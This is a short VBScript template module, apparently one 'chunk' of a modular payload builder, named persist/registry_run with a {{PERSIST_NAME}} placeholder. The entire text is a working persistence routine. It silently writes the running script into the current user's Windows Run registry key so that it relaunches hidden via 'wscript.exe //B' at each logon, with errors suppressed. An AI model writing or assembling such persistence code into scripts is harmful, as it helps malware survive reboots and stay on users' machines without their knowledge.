' chunk: persist/registry_run
' depends: core/run_cmd
' provides: persist_registry
' format: vbscript

Sub persist_registry()
    On Error Resume Next
    _s.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\{{PERSIST_NAME}}", _
        "wscript.exe //B """ & WScript.ScriptFullName & """", "REG_SZ"
    On Error GoTo 0
End Sub
